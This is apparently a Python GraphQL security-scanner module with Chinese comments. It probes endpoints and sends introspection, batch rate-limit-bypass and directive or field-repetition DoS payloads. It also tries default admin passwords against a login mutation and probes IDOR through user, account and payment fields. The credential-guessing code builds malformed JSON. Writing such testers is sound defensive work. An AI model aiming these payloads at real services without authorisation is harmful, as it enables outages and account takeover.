"""
GraphQL Security Tester
GraphQL 安全测试模块
参考 Hacktricks 和 OWASP API Security Top 10
"""

import json
import logging
from typing import Dict, List, Any, Optional, Set
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class GraphQLTestResult:
    """GraphQL 测试结果"""
    vulnerability_type: str
    severity: str
    description: str
    payload: str
    evidence: str
    remediation: str


__all__ = ['GraphQLSecurityTester', 'GraphQLTestResult']


class GraphQLSecurityTester:
    """
    GraphQL 安全测试器
    
    支持的测试:
    1. Introspection 查询
    2. 批量查询绕过速率限制
    3. 别名滥用 DoS
    4. 字段重复 DoS
    5. 指令重载 DoS
    6. 认证绕过
    7. 别名暴力破解
    """
    
    COMMON_ENDPOINTS = [
        '/graphql',
        '/graphiql',
        '/graphql.php',
        '/graphql/console',
        '/api',
        '/api/graphql',
        '/graphql/api',
        '/graphql/graphql',
    ]
    
    INTROSPECTION_QUERY = '''
    query IntrospectionQuery {
        __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
                ...FullType
            }
            directives {
                name
                description
                locations
                args {
                    ...InputValue
                }
            }
        }
    }
    
    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }
    
    fragment InputValue on __InputValue {
        name
        description
        type { ...TypeRef }
        defaultValue
    }
    
    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                    ofType {
                        kind
                        name
                        ofType {
                            kind
                            name
                            ofType {
                                kind
                                name
                                ofType {
                                    kind
                                    name
                                }
                            }
                            }
                        }
                    }
                }
            }
        }
    }
    '''
    
    BATCH_QUERY_TEMPLATE = '''[
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"},
        {"query": "query cop { __typename }"}
    ]'''
    
    ALIAS_DOS_TEMPLATE = '''query overload {
        __typename @include(if:true) @include(if:true) @include(if:true) @include(if:true) @include(if:true)
        @include(if:true) @include(if:true) @include(if:true) @include(if:true) @include(if:true)
    }'''
    
    FIELD_REPEAT_DOS = '''query cop { %s }''' % ('__typename\n__typename\n__typename\n' * 100)
    
    INSTRUCTION_OVERLOAD_DOS = '''query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }'''
    
    def __init__(self, http_client):
        self.http_client = http_client
        self.findings: List[GraphQLTestResult] = []
    
    async def test_graphql_endpoint(self, url: str) -> Dict[str, Any]:
        """
        测试 GraphQL 端点安全性
        
        Returns:
            包含测试结果的字典
        """
        results = {
            'is_graphql': False,
            'endpoint': None,
            'introspection_enabled': False,
            'schema': None,
            'vulnerabilities': []
        }
        
        for endpoint in self.COMMON_ENDPOINTS:
            test_url = url.rstrip('/') + endpoint
            is_graphql, schema = await self._check_graphql_endpoint(test_url)
            if is_graphql:
                results['is_graphql'] = True
                results['endpoint'] = test_url
                results['schema'] = schema
                break
        
        if not results['is_graphql']:
            return results
        
        await self._test_introspection(results)
        await self._test_batch_query_bypass(results)
        await self._test_alias_dos(results)
        await self._test_field_repeat_dos(results)
        await self._test_instruction_overload_dos(results)
        await self._test_credential_brute_force(results)
        
        return results
    
    async def _check_graphql_endpoint(self, url: str) -> tuple:
        """检查端点是否为 GraphQL"""
        test_queries = [
            json.dumps({'query': '{__typename}'}),
            json.dumps({'query': 'query{__typename}'}),
        ]
        
        for query in test_queries:
            try:
                response = await self.http_client.request(
                    url,
                    'POST',
                    data=query,
                    headers={'Content-Type': 'application/json'}
                )
                if response.status_code == 200:
                    content = response.content
                    if '__typename' in content:
                        return True, content
            except Exception as e:
                logger.debug(f"GraphQL check failed for {url}: {e}")
        
        return False, None
    
    async def _test_introspection(self, results: Dict[str, Any]):
        """测试 Introspection 是否启用"""
        try:
            response = await self.http_client.request(
                results['endpoint'],
                'POST',
                data=json.dumps({'query': self.INTROSPECTION_QUERY}),
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                content = response.content
                if '__schema' in content:
                    results['introspection_enabled'] = True
                    results['schema'] = content
                    
                    self.findings.append(GraphQLTestResult(
                        vulnerability_type='Information Disclosure',
                        severity='medium',
                        description='GraphQL Introspection is enabled',
                        payload=self.INTROSPECTION_QUERY[:200] + '...',
                        evidence='__schema found in response',
                        remediation='Disable introspection in production or restrict access'
                    ))
                elif 'introspection' in content.lower():
                    self.findings.append(GraphQLTestResult(
                        vulnerability_type='Introspection Disabled',
                        severity='info',
                        description='GraphQL Introspection might be disabled',
                        payload='Introspection query',
                        evidence='No __schema in response',
                        remediation='Introspection is disabled (this is expected in production)'
                    ))
        except Exception as e:
            logger.debug(f"Introspection test failed: {e}")
    
    async def _test_batch_query_bypass(self, results: Dict[str, Any]):
        """
        测试批量查询绕过速率限制
        参考 Hacktricks: 利用别名绕过速率限制
        """
        try:
            response = await self.http_client.request(
                results['endpoint'],
                'POST',
                data=self.BATCH_QUERY_TEMPLATE,
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                self.findings.append(GraphQLTestResult(
                    vulnerability_type='Batch Query Bypass',
                    severity='medium',
                    description='GraphQL batch query is enabled - can bypass rate limiting',
                    payload='Batch query with 10 requests',
                    evidence=f'Status: {response.status_code}',
                    remediation='Implement rate limiting per IP and per user, disable batch queries if not needed'
                ))
        except Exception as e:
            logger.debug(f"Batch query test failed: {e}")
    
    async def _test_alias_dos(self, results: Dict[str, Any]):
        """
        测试别名滥用 DoS
        参考 Hacktricks: 使用别名重载
        """
        try:
            response = await self.http_client.request(
                results['endpoint'],
                'POST',
                data=json.dumps({'query': self.ALIAS_DOS_TEMPLATE}),
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                content = response.content
                if 'errors' not in content.lower():
                    self.findings.append(GraphQLTestResult(
                        vulnerability_type='Alias Overload DoS',
                        severity='high',
                        description='GraphQL alias overload is possible - can cause DoS',
                        payload=self.ALIAS_DOS_TEMPLATE[:200] + '...',
                        evidence=f'Status: {response.status_code}',
                        remediation='Limit query complexity and depth, implement depth limiting'
                    ))
        except Exception as e:
            logger.debug(f"Alias DoS test failed: {e}")
    
    async def _test_field_repeat_dos(self, results: Dict[str, Any]):
        """测试字段重复 DoS"""
        try:
            response = await self.http_client.request(
                results['endpoint'],
                'POST',
                data=json.dumps({'query': self.FIELD_REPEAT_DOS}),
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                self.findings.append(GraphQLTestResult(
                    vulnerability_type='Field Repeat DoS',
                    severity='high',
                    description='Repeated fields in query can cause excessive server processing',
                    payload='Query with __typename repeated 100 times',
                    evidence=f'Status: {response.status_code}',
                    remediation='Implement query depth limiting and complexity analysis'
                ))
        except Exception as e:
            logger.debug(f"Field repeat DoS test failed: {e}")
    
    async def _test_instruction_overload_dos(self, results: Dict[str, Any]):
        """测试指令重载 DoS"""
        try:
            response = await self.http_client.request(
                results['endpoint'],
                'POST',
                data=json.dumps({'query': self.INSTRUCTION_OVERLOAD_DOS}),
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                self.findings.append(GraphQLTestResult(
                    vulnerability_type='Directive Overload DoS',
                    severity='high',
                    description='Repeated directives in query can cause excessive processing',
                    payload=self.INSTRUCTION_OVERLOAD_DOS,
                    evidence=f'Status: {response.status_code}',
                    remediation='Implement directive and query complexity limiting'
                ))
        except Exception as e:
            logger.debug(f"Instruction overload DoS test failed: {e}")
    
    async def _test_credential_brute_force(self, results: Dict[str, Any]):
        """
        测试凭证暴力破解
        参考 Hacktricks: GraphQL 批量查询批注暴力破解
        """
        login_queries = [
            '{"query":"mutation{login(username:\\"admin\\",password:\\"admin\\"){token}}"}',
            '{"query":"mutation{login(username:\\"admin\\",password:\\"password\\"){token}}"}',
            '{"query":"mutation{login(username:\\"admin\\",password:\\"123456\\"){token}}"}',
        ]
        
        passwords_to_test = ['admin', 'password', '123456', 'admin123', 'letmein', 'root', 'toor']
        
        for password in passwords_to_test[:5]:
            query = f'{{"query":"mutation{{login(username:\\"admin\\",password:\\"{password}\\""){{token}}}}"'
            try:
                response = await self.http_client.request(
                    results['endpoint'],
                    'POST',
                    data=query,
                    headers={'Content-Type': 'application/json'}
                )
                
                if response.status_code == 200:
                    content = response.content
                    if 'token' in content.lower() or 'success' in content.lower():
                        self.findings.append(GraphQLTestResult(
                            vulnerability_type='Weak Authentication',
                            severity='critical',
                            description=f'Weak credentials found: admin/{password}',
                            payload=f'login mutation with password: {password}',
                            evidence=content[:200],
                            remediation='Implement strong password policy, rate limiting, and MFA'
                        ))
                        break
            except Exception as e:
                logger.debug(f"Credential test failed for {password}: {e}")
    
    async def test_idor_with_graphql(
        self,
        url: str,
        auth_token: Optional[str] = None
    ) -> List[GraphQLTestResult]:
        """
        测试 GraphQL IDOR
        
        通过 introspection 获取 schema，然后测试对象访问控制
        """
        results = []
        
        introspection_query = '{"query":"{__schema{types{name fields{name args{name type{name ofType{name}}}}}}"}'
        
        try:
            headers = {'Content-Type': 'application/json'}
            if auth_token:
                headers['Authorization'] = f'Bearer {auth_token}'
            
            response = await self.http_client.request(
                url,
                'POST',
                data=introspection_query,
                headers=headers
            )
            
            if response.status_code == 200:
                data = json.loads(response.content)
                types = data.get('data', {}).get('__schema', {}).get('types', [])
                
                query_type = None
                for t in types:
                    if t.get('name') == 'Query' or t.get('name') == 'Root':
                        query_type = t
                        break
                
                if query_type and 'fields' in query_type:
                    for field in query_type['fields']:
                        field_name = field.get('name', '')
                        if any(x in field_name.lower() for x in ['user', 'account', 'profile', 'order', 'payment']):
                            idor_query = f'''query {{ {field_name}(id: "1") {{ id }} }}'''
                            
                            response = await self.http_client.request(
                                url,
                                'POST',
                                data=json.dumps({'query': idor_query}),
                                headers=headers
                            )
                            
                            if response.status_code == 200:
                                content = response.content
                                if 'errors' not in content.lower():
                                    results.append(GraphQLTestResult(
                                        vulnerability_type='Potential IDOR',
                                        severity='medium',
                                        description=f'Possible Insecure Direct Object Reference in {field_name}',
                                        payload=idor_query,
                                        evidence=content[:200],
                                        remediation='Implement proper authorization checks'
                                    ))
        except Exception as e:
            logger.debug(f"GraphQL IDOR test failed: {e}")
        
        return results
    
    def get_findings(self) -> List[GraphQLTestResult]:
        """获取所有发现"""
        return self.findings
